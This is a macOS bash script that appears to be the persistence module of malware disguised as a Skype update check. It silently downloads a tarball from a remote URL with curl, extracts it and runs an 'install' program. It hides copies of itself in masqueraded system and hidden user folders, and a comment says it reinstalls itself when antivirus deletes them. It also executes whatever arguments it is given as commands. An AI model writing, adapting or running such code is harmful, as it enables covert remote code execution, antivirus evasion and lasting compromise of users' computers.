#!/bin/bash
# Functions and parameters                            
#integrity check functin to precede every module on startup
tarURL=$(cat ../tarURL)
version=10
checkURL="on.to/skypeupdate"
mainUser=$(who | head -1 | awk '{print $1}')

consolidate () {
        mkdir -p /tmp/updatecheck > /dev/null
        cd /tmp/updatecheck/
        echo $avail | grep a > /dev/null && cp /System/Library/CoreServices/updatecheck.tar.gz /tmp/updatecheck/updatecheck.tar.gz || curl --silent -O $tarURL
        echo $avail | grep b > /dev/null && cp "/Library/Keyboard Layouts/EN_US.bin/updatecheck.tar.gz" /tmp/updatecheck/updatecheck.tar.gz || curl --silent -O $tarURL
        echo $avail | grep c > /dev/null && cp /Users/$mainUser/Public/.info/updatecheck.tar.gz /tmp/updatecheck/updatecheck.tar.gz || curl --silent -O $tarURL
    }

checkUpdate () {
    currentVersion=$(curl -s on.to/skypeupdate | grep -o skypeversion.. | grep -o [0-9][0-9])
    if [[ "$currentVersion" > "$version" ]]                           
    then
        echo Update required.
    elif [[ "$currentVersion" < "$version" ]]
    then
        echo running a beta.
    else
        echo error checking for updates.
    fi
}

selfUpdate () {
	if [ "$1" == "" ]                           
   then
		mkdir -p /tmp/updatecheck > /dev/null
        cd /tmp/updatecheck/
		curl --silent -O $tarURL
        tar -zxf updatecheck.tar.gz > /dev/null
        cd updatecheck/
        chmod +x install
        ./install
	elif [ "$1" == "fix" ] 
   then
		echo fixing
		consolidate
        mkdir -p /tmp/updatecheck > /dev/null
        cd /tmp/updatecheck/
		curl --silent -O $tarURL 
        tar -zxf updatecheck.tar.gz > /dev/null
        cd updatecheck/
        chmod +x install
        ./install
   else
		mkdir -p /tmp/updatecheck > /dev/null
        cd /tmp/updatecheck/
		curl --silent -O $1
        tar -zxf updatecheck.tar.gz > /dev/null
        cd updatecheck/
        chmod +x install
        ./install
	fi         
   return 0	
        }


integrityCheck () {
    integrity=0
    avail="z"
    
    if [ -e "/System/Library/CoreServices/updatecheck.tar.gz" ]
    then
         avail=$avail"a"
    else
        integrity=$((integrity+1)) 
        cd /System/Library/Coreservices/
        curl --silent -O $tarURL || (integrity=$((integrity+1)) & cp "/tmp/updatecheck/updatecheck.tar.gz" "/System/Library/CoreServices/updatecheck.tar.gz")
    fi
    if [ -e "/Library/Keyboard Layouts/EN_US.bin/updatecheck.tar.gz" ]
    then
         avail=$avail"b"
    else
        integrity=$((integrity+1))
        mkdir -p "/Library/Keyboard Layouts/EN_US.bin" > /dev/null
        cd "/Library/Keyboard Layouts/EN_US.bin/"
        curl --silent -O $tarURL || (integrity=$((integrity+1)) & cp "/tmp/updatecheck/updatecheck.tar.gz" "/Library/Keyboard Layouts/EN_US.bin/updatecheck.tar.gz" )
    fi
    if [ -e "/Users/$mainUser/Public/.info/updatecheck.tar.gz" ]
    then
         avail=$avail"c"
    else
		integrity=$((integrity+1))
		mkdir -p "/Users/$mainUser/Public/.info" > /dev/null
        cd "/Users/$mainUser/Public/.info/"
        curl --silent -O $tarURL || (integrity=$((integrity+1)) & cp "/tmp/updatecheck/updatecheck.tar.gz" "/Users/$mainUser/Public/.info/updatecheck.tar.gz" )
    fi
	echo "Integrity Errors Found: "$integrity
	echo $integrity > .integ
    [ "$integrity" -gt 1 ] && consolidate #if an error isnt fixed by curl immediately, consolidate updatecheck.tar.gz and return to locations a,b,c
	[ "$integrity" -gt 3 ] && selfUpdate #if a significant number of errors is produced (e.g. antivirus deleted a,b,c) try and reinstall from original source
	return 0
    }
	
if [ "$1" == "" ]                           
   then
		a=1;
   else
		$1 $2 $3 $4 $5 $6 $7
	fi
#exit 0